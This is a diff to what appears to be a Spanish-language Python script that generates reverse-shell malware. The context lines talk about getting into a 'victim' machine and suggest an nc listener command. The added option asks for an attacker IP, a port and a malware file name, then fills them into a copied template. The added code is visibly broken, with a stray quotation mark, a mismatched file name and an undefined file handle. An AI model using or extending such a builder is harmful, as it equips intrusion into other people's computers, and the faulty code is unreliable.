@@ -123,8 +123,37 @@ if numero == 2:
        Sin listener no puedo entrar al equipo victima :(
        Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.""")
 
+               
+if numero == 3:
+    ip = input("""
 
-   
+    Introduzca su IP
+
+    >  """)
+
+    puerto = input("""
+
+    Introduzca un puerto
+
+    >  """)
+
+    name_malware = input("""
+
+    Introduzca un nombren para el archivo
+
+    >  """)
+
+    os.system('cp plantilla.py '+ name_malware +'.py')
+    with open(""+ name_malware +"", "rt")as f:
+      x = f.read()
+
+    with open(""+ name_malware +".py", "wt"")as f:
+      x = x.replace("ip", ""+ ip +"")
+      x = x.replace("puerto", ""+ puerto +"")
+      fin.write(x)
+
+
+
 
    
    
